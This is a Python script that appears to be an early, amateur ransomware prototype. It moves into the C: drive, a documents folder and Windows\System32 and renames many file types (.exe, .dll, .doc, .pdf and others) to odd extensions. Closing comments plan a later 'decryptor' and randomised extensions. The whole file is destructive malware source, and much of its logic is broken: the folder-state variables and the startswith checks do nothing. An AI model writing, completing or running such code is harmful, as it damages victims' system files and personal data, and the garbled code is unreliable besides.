from os import rename, listdir
import os
import os.path
#home = expanduser("~") #gets you to the home directory.
folds = 0
def dirDesktop():
	folds = 1
	os.chdir("C:")
	DesktopInf();
def dirCDrive():
	folds = 2
	os.chdir("C:\\My Documents")
	DesktopInf();
def dirSys32():
	folds = 3
	os.chdir("C:\\Windows\\System32")
def DesktopInf():
	fnames = listdir('.')
	for fname in fnames:
		pref = ".txt"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.kys', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".png"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.Nope', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".jpg"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.hahz', 1))
		pass
	fnames = listdir('.')
	for fname in fnames: # this is a test to see if it works correctly ,nvm.
		pref = ".exe"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.text', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".pdf"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.uppt', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".doc"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.help', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".dll"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.send', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".xml"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.haz', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".bat"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.han', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".vbs"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.negative', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".py"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.lentro', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".dbx"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.Data', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".html"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.wex', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".inf"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.washington', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".rar"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.car', 1))
		pass
	fnames = listdir('.')
	for fname in fnames:
		pref = ".ppt"
		print (fname)
		fname.startswith(pref)
		os.rename(fname, fname.replace(pref, '.wazup', 1))
		pass
		fnames = listdir('.')
		dirCDrive();
		

if folds == 0: #Have to test later but this should be a way to go to each new directory
	dirDesktop();
elif folds == 1:
	dirCDrive();
elif folds == 2:
	dirSys32();


#make a directory to change the Sys32 and their documents etc. all files
#each variety of file will have a different extension to change to, so that I can make a decryptor 
#Maybe give something like the text file extension randomized so instead of just .kys it can also be .locke or something like that. Note that this will make more work for me when making a decryptor...
